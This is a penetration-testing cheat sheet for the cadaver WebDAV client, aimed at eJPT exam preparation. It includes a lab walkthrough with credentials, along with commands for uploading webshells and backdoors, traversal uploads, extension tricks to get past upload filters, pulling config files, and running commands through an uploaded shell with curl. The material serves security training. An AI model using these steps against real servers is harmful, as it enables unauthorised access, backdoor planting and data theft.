# 📁 Cadaver - Command-Line WebDAV Client

Cadaver is a command-line WebDAV client for Unix/Linux systems that allows interactive file management on WebDAV-enabled web servers.

**Location in Framework:** `web-pentesting/file-upload/cadaver.md`

---

## 🎯 What is Cadaver?

Cadaver is a WebDAV client that provides:
- Interactive command-line interface for WebDAV servers
- File upload/download capabilities  
- Directory browsing and management
- Authentication support
- Scriptable operations for automation

---

## 🔧 Basic Syntax

```bash
cadaver [options] http://webdav-server/path/
```

---

## 🚀 Interactive Commands

Once connected to WebDAV server, use these commands:

### Navigation & Listing
| Command | Description | Example |
|---------|-------------|---------|
| `ls` | List directory contents | `ls` |
| `cd <dir>` | Change directory | `cd uploads` |
| `pwd` | Print current directory | `pwd` |

### File Operations  
| Command | Description | Example |
|---------|-------------|---------|
| `put <local> [remote]` | Upload file | `put shell.asp` |
| `get <remote> [local]` | Download file | `get file.txt` |
| `mput <pattern>` | Upload multiple files | `mput *.php` |
| `mget <pattern>` | Download multiple files | `mget *.txt` |

### Directory Operations
| Command | Description | Example |
|---------|-------------|---------|
| `mkdir <dir>` | Create directory | `mkdir uploads` |
| `rmdir <dir>` | Remove directory | `rmdir testdir` |
| `delete <file>` | Delete file | `delete shell.asp` |

---

## 🧪 Real Lab Example (WebDAV IIS Server)

### Step 1: Initial Connection
```bash
cadaver http://demo.ine.local/webdav
```

**Authentication Prompt:**
```
Authentication required for demo.ine.local on server 'demo.ine.local':
Username: bob
Password: password_123321
```

### Step 2: Directory Listing
```bash
dav:/webdav/> ls
Listing collection '/webdav/': succeeded.
Coll:   DavTestDir_AqOe5dckmtF             0  Jul 10 09:39
        AttackDefense.txt                 13  Jan  2  2021
        web.config                       168  Jan  2  2021
```

### Step 3: Upload Webshell
```bash
dav:/webdav/> put /usr/share/webshells/asp/webshell.asp
Uploading /usr/share/webshells/asp/webshell.asp to `/webdav/webshell.asp':
Progress: [=============================>] 100.0% of 1302 bytes succeeded.
```

### Step 4: Verify Upload
```bash
dav:/webdav/> ls
Listing collection '/webdav/': succeeded.
Coll:   DavTestDir_AqOe5dckmtF             0  Jul 10 09:39
        AttackDefense.txt                 13  Jan  2  2021
        web.config                       168  Jan  2  2021
        webshell.asp                   1302  Jul 10 09:42
```

---

## 🔧 Command Line Options

| Option | Description | Example |
|--------|-------------|---------|
| `-t <seconds>` | Connection timeout | `cadaver -t 30 http://target/webdav/` |
| `-r <file>` | Execute script file | `cadaver -r script.txt http://target/webdav/` |
| `-V` | Show version | `cadaver -V` |

---

## 📜 Batch Operations & Scripting

### Create Upload Script
```bash
# upload_script.txt
put /usr/share/webshells/asp/cmd.asp
put /usr/share/webshells/php/simple-backdoor.php  
ls
quit
```

### Execute Script
```bash
cadaver -r upload_script.txt http://demo.ine.local/webdav/
```

---

## 🚨 Security Applications

### Webshell Upload
```bash
dav:/webdav/> put /usr/share/webshells/asp/webshell.asp
```

### Backdoor Deployment
```bash
# Upload ASP backdoor for IIS
dav:/webdav/> put /path/to/backdoor.asp

# Upload PHP backdoor for Apache/Nginx  
dav:/webdav/> put /path/to/backdoor.php
```

### Data Exfiltration
```bash
# Download sensitive files
dav:/webdav/> get database.config
dav:/webdav/> get web.config
dav:/webdav/> mget *.txt
```

---

## 🔍 Common WebDAV Directories to Test

```bash
# Common WebDAV paths
cadaver http://target.com/webdav/
cadaver http://target.com/uploads/  
cadaver http://target.com/files/
cadaver http://target.com/documents/
cadaver http://target.com/sharepoint/
cadaver http://target.com/exchange/
```

---

## 🧰 Integration with Penetration Testing Workflow

### 1. Discovery Phase
```bash
# Nmap discovers WebDAV
nmap --script http-enum -p 80 target.com
```

### 2. Capability Testing  
```bash
# DAVTest checks upload capabilities
davtest -auth bob:password123 -url http://target.com/webdav/
```

### 3. Manual Exploitation
```bash
# Cadaver for precise file operations
cadaver http://target.com/webdav/
dav:/webdav/> put webshell.asp
```

### 4. Post-Exploitation
```bash
# Access uploaded webshell via browser/curl
curl "http://target.com/webdav/webshell.asp?cmd=whoami"
```

---

## 💡 Advanced Techniques

### Multiple File Upload
```bash
dav:/webdav/> mput /usr/share/webshells/asp/*
```

### Steganography Upload
```bash
# Upload legitimate-looking files with hidden content
dav:/webdav/> put image_with_payload.jpg
dav:/webdav/> put document_with_macro.docx
```

### Directory Traversal Attempts
```bash
dav:/webdav/> put ../../../backdoor.asp
dav:/webdav/> put ../../inetpub/wwwroot/shell.asp
```

---

## ⚠️ Common Issues & Solutions

### Authentication Issues
```bash
# Different auth formats to try:
Username: domain\user
Username: user@domain.com  
Username: user
```

### SSL Certificate Issues
```bash
# Accept self-signed certificates
cadaver --insecure https://target.com/webdav/
```

### Permission Denied
```bash
# Try different directories
cadaver http://target.com/uploads/
cadaver http://target.com/temp/
cadaver http://target.com/public/
```

### File Upload Blocked
```bash
# Try different extensions
dav:/webdav/> put shell.asp
dav:/webdav/> put shell.txt
dav:/webdav/> put shell.asp.txt
```

---

## 🎯 eJPT Exam Tips

### Key Points:
1. Always authenticate when required
2. Use `ls` to verify successful uploads
3. Remember common webshell locations:
   - `/usr/share/webshells/asp/`
   - `/usr/share/webshells/php/`
   - `/usr/share/webshells/jsp/`

### Common Workflow:
1. Connect with credentials
2. List directory contents
3. Upload appropriate webshell for target server
4. Verify upload with `ls`
5. Access webshell via browser

---

## 📝 Documentation for Reports

When using Cadaver, document:
- Target WebDAV URL and credentials used
- Files successfully uploaded
- Directory structure discovered  
- Any access control bypasses found
- Screenshots of successful uploads and directory listings

---

## 🔗 Related Tools

### Complementary Tools:
- **DAVTest** - Automated capability testing
- **Nikto** - WebDAV vulnerability scanning  
- **DirBuster** - WebDAV directory enumeration
- **Burp Suite** - Manual WebDAV request analysis

### Alternative WebDAV Clients:
- **davix-put** - Simple upload utility
- **curl** - HTTP/WebDAV requests
- **wput** - Upload utility
